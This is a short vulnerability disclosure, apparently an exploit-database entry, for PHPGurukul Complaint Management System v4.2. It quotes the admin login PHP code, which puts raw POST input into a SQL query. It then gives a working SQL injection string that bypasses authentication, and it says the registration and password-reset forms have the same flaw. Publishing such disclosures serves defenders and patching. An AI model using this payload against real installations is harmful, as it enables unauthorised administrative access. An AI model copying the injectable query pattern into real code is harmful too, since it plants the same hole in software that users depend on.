# Author: Besim ALTINOK
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/complaint-management-sytem/
# Version: v4.2
# Tested on: Xampp
# Credit: Ä°smail BOZKURT

------ Details:

1- Vulnerable code is here:

if(isset($_POST[&#039;submit&#039;]))
{
$username=$_POST[&#039;username&#039;];
$password=md5($_POST[&#039;password&#039;]);
$ret=mysqli_query($con,"SELECT * FROM admin WHERE
username=&#039;$username&#039; and password=&#039;$password&#039;");
$num=mysqli_fetch_array($ret);
if($num>0)
{
$extra="change-password.php";//
$_SESSION[&#039;alogin&#039;]=$_POST[&#039;username&#039;];
$_SESSION[&#039;id&#039;]=$num[&#039;id&#039;];
$host=$_SERVER[&#039;HTTP_HOST&#039;];
$uri=rtrim(dirname($_SERVER[&#039;PHP_SELF&#039;]),&#039;/\\&#039;);
header("location:http://$host$uri/$extra");
exit();
}

2- We can bypass authentication with SQLi:

Bypass code (admin login panel):

Username: pentester&#039; or&#039;1&#039;=1#
Password : pentester&#039; or&#039;1&#039;=1#

Finally: There is a lot of SQLi input in this project. Like, login,
registration, forgot password ...
-----------------------------------

